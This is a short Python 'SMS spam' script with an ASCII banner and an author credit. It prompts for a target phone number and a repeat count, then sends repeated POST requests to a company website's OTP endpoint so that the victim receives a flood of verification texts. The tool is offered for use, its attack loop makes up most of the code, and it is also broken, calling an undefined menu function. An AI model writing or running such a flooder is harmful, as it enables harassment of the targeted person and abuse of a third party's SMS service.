#!/usr/bin/python
#coding=utf-8

import json,os,sys
from subprocess import call
from urllib import request

			
os.system('clear')

print("""\033[1;97m
 ___ _ __   __ _ _ __ ___
/ __| '_ \ / _` | '_ ` _ \

\__ \ |_) | (_| | | | | | |
|___/ .__/ \__,_|_| |_| |_|
      |_|
""")
print('auhtor script : Mbokey Bhizer X Reall')
print('script Spam SMS Unlimited')
print('\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;97m Example : 0895xxxxxx')

nomor=input('\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;97m number target : ')

while True:
	try:
		mex=int(input('\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;97m jumlah spam (MAX-3) : '))
		print ("")
		break
	except : continue
		
for max in range(mex):
	req = request.Request('https://www.nutriclub.co.id/otp/?phone='+nomor+'&old_phone='+nomor, method="POST")
	r = json.loads(request.urlopen(req).read())
	if r['StatusCode']=='00':
		print('\033[1;92m[✓] spam berhasil terkirim : '+nomor+'\033[1;97m')
	else:
		print('\033[1;91m[!] spam gagal terkirim : '+nomor+'\033[1;97m')
	
print ("\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;97m Finished...")
mex=int(input('balik ke menu lagi'))
menu()
if __name__ == '__main__':
#    os.system('git pull')
   # folder()
    menu()    